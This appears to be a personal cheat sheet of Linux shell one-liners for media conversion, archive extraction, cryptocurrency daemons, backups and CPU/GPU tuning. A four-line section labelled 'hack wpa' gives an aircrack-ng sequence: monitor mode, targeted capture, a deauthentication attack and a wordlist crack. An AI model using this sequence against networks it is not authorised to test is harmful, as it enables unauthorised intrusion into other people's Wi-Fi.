unrar all archives in current folder  
`$ for f in *.rar;do unrar e -o+ $f;done`  

show folder size
`$ du -h --max-depth=1`  

convert movie to xbox360 format
`$ ffmpeg -i "file.mkv" -vcodec libx264 -acodec ac3 -ab 160k "file.mp4"`  

batch convert above
```$ for i in *.mkv;   do name=`echo $i | cut -d'.' -f1`;   echo $name;   ffmpeg -i "$i" "${name}.mp4" -vcodec libx264 -acodec ac3 -ab 160k; done ```

monero daemon
`$ monerod --data-dir /mnt/cloud/monero`  

import gpg key for aur packages
`$ gpg --receive-key keyid`  

ethereum blockchain sync
`$ geth --syncmode "fast"`  

show external ip
`$ curl ifconfig.me`  

weather forecast
`$ curl wttr.in/Wilhelmshaven`  

set gtk cursor global value for browsers $ gsettings set org.gnome.desktop.interface cursor-theme Adwaita  
calculator $ bc  
backup through ssh $ rsync -avz /source/folder/ user@remoteadress:/remote_folder  
unrar all archives in folder (autoverwrite enabled)  $ find . -name "*.rar" -exec unrar x -o+ {} \;  
show cpu frequency $ cat /proc/cpuinfo | grep "MHz" & watch -n1 "cat /proc/cpuinfo | grep \"^[c]pu MHz\""  
force cpu governor $ sudo cpupower frequency-set -g powersave or performance  
list available governors $ cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors  
show network usage $ iftop  
create playlist $ ls -1 *.mp4 > playlist.m3u  
cut characters playlist example $ cut -c 50- playlist.m3u > newplaylist.m3u  
batch rename delete example $ for file in *text* ; do mv "$file" "`echo $file | sed 's/\text//'`" ; done  
output orphaned packages to file & run removal  $ sudo pacman -Qqdt > pkglist.txt & sudo pacman -R - < pkglist.txt  
hack wpa $ airmon-ng start wlp2s0f0u4 & airodump wlp2s0f0u4mon  
hack wpa target network $ airodump-ng -c 10 --bssid 00:14:BF:E0:E8:D5 -w /root/aircrack/ wlp2s0f0u4mon  
force handshake $ aireplay-ng –0 2 –a [router bssid] –c [client bssid] wlp2s0f0u4mon  
crack with wordlist $ aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/aircrack/*.cap  
get nvme temperature $ sudo nvme smart-log /dev/nvme0 | grep temperature  
delete all but given extension $ find . -type f ! -name '*.txt' -delete  
amd vega current values $ watch -n 0.5 sudo cat /sys/kernel/debug/dri/0/amdgpu_pm_info  
disable vsync environment variable $ vblank_mode=0  
current vega voltage values $ sudo cat /sys/class/drm/card0/device/pp_od_clk_voltage  
force high dpm on graphics card $ echo high > /sys/class/drm/card0/device/power_dpm_force_performance_level  
